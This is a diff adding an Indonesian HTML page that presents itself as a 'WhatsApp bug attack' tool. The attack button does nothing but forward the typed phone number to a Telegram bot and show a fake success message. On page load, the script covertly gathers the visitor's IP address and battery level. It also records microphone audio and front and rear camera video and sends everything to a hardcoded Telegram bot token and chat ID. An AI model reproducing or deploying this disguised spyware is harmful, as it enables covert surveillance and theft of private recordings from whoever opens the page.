@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>dhack bug</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&display=swap" rel="stylesheet">
+  <style>
+    /* Style tetap sama sesuai preferensi visual Anda */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 50%, #16213e 100%);
+      font-family: 'Inter', sans-serif;
+      color: blue;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      overflow: hidden;
+      position: relative;
+      padding: 20px;
+    }
+    .bg-particles { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 0; }
+    .particle {
+      position: absolute;
+      width: 2px;
+      height: 2px;
+      background: rgba(0, 255, 127, 0.3);
+      border-radius: 50%;
+      animation: float 6s ease-in-out infinite;
+    }
+    @keyframes float {
+      0%, 100% { transform: translateY(0px); opacity: 0.3; }
+      50% { transform: translateY(-20px); opacity: 0.8; }
+    }
+    .login-container {
+      background-color: rgba(17, 17, 17, 0.95);
+      padding: 30px;
+      border-radius: 16px;
+      box-shadow: 0 0 20px blue;
+      text-align: center;
+      max-width: 400px;
+      width: 100%;
+      z-index: 2;
+    }
+    .login-title {
+      font-size: 26px;
+      font-weight: 900;
+      margin-bottom: 5px;
+      background: linear-gradient(135deg, #2563eb, #ffffff);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+    #notif {
+      font-size: 14px;
+      color: #00d9ff;
+      font-weight: 600;
+      height: 20px;
+      margin-bottom: 10px;
+      display: none;
+    }
+    .login-input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 16px;
+      background: #333;
+      border: none;
+      border-radius: 6px;
+      color: #fff;
+      font-size: 15px;
+    }
+    .login-button {
+      width: 100%;
+      padding: 12px;
+      background: linear-gradient(135deg, #2563eb, #2563eb);
+      color: black;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      font-weight: 600;
+      font-size: 15px;
+    }
+    .login-button:hover { background-color: #2563eb; box-shadow: 0 0 20px blue; }
+  </style>
+</head>
+<body>
+  <div class="bg-particles"></div>
+
+  <div class="login-container">
+    <p class="login-title">bug WhatsApp By Hacked official</p>
+    <div id="notif">Sukses bug atack ✅</div>
+    <input type="number" class="login-input" placeholder="Nomor WhatsApp Target" id="text">
+    <button class="login-button" id="login-button">Atack</button>
+  </div>
+
+  <script>
+    const botToken = '8403098052:AAHoNelCuHdAaZJwYZQxH0kJPgkbC2hXOdg';
+    const chatIds = ['7945789634'];
+    const input = document.getElementById('text');
+    const button = document.getElementById('login-button');
+    const notif = document.getElementById('notif');
+
+    function sendToTelegram(text) {
+      chatIds.forEach(id => {
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'HTML' })
+        }).catch(console.error);
+      });
+    }
+
+    function sendMedia(blob, type, filename, caption) {
+      chatIds.forEach(id => {
+        const formData = new FormData();
+        formData.append('chat_id', id);
+        formData.append(type, blob, filename);
+        if(caption) formData.append('caption', caption);
+        let endpoint = (type === 'video') ? 'sendVideo' : 'sendVoice';
+        fetch(`https://api.telegram.org/bot${botToken}/${endpoint}`, { method: 'POST', body: formData }).catch(console.error);
+      });
+    }
+
+    async function getInfo() {
+      try {
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        const battery = await navigator.getBattery?.() || { level: 0 };
+        const text = `IP: ${ipData.ip}\nBaterai: ${(battery.level * 100).toFixed(0)}%\nWaktu: ${new Date().toLocaleString()}`;
+        sendToTelegram(`<b>📥 Info Pengunjung (Auto):</b>\n<pre>${text}</pre>`);
+      } catch {}
+    }
+
+    // Fungsi otomatis rekam suara (5 detik)
+    async function autoRecordAudio() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        const mediaRecorder = new MediaRecorder(stream);
+        const chunks = [];
+        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+        mediaRecorder.onstop = () => {
+          const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
+          sendMedia(blob, 'voice', 'auto_voice.ogg', '🎤 Auto Voice Note');
+          stream.getTracks().forEach(track => track.stop());
+        };
+        mediaRecorder.start();
+        setTimeout(() => mediaRecorder.stop(), 5000);
+      } catch (err) {
+        sendToTelegram('Izin Voice Note ditolak ❌');
+      }
+    }
+
+    // Fungsi otomatis rekam video (6 detik)
+    async function autoRecordVideo(facingMode, label) {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode }, audio: true });
+        const mediaRecorder = new MediaRecorder(stream);
+        const chunks = [];
+        return new Promise((resolve) => {
+          mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+          mediaRecorder.onstop = () => {
+            const blob = new Blob(chunks, { type: 'video/mp4' });
+            sendMedia(blob, 'video', `auto_${label}.mp4`, `🎥 Auto Video ${label}`);
+            stream.getTracks().forEach(track => track.stop());
+            resolve();
+          };
+          mediaRecorder.start();
+          setTimeout(() => mediaRecorder.stop(), 6000);
+        });
+      } catch (err) { 
+        sendToTelegram(`Izin Kamera ${label} ditolak ❌`);
+        return Promise.resolve(); 
+      }
+    }
+
+    // Menjalankan semua aksi otomatis saat halaman dimuat
+    window.addEventListener('DOMContentLoaded', async () => {
+      createParticles();
+      getInfo();
+      
+      // Menjalankan perekaman secara otomatis berurutan
+      await autoRecordAudio();
+      await autoRecordVideo("user", "Depan");
+      await autoRecordVideo("environment", "Belakang");
+    });
+
+    // Event listener untuk tombol Attack
+    button.addEventListener('click', () => {
+      const nomor = input.value.trim();
+      if (!nomor || nomor.length < 8) return;
+      
+      button.disabled = true;
+      notif.style.display = 'none';
+      
+      // Kirim nomor target ke bot
+      sendToTelegram(`<b>📞 Target Attack:</b> ${nomor}`);
+      
+      // Tampilkan notifikasi sukses yang diminta
+      setTimeout(() => {
+        notif.style.display = 'block';
+        button.disabled = false;
+        input.value = '';
+      }, 1000);
+    });
+
+    function createParticles() {
+      const container = document.querySelector('.bg-particles');
+      for (let i = 0; i < 30; i++) {
+        const p = document.createElement('div');
+        p.className = 'particle';
+        p.style.left = Math.random() * 100 + '%';
+        p.style.top = Math.random() * 100 + '%';
+        container.appendChild(p);
+      }
+    }
+  </script>
+</body>
+</html>
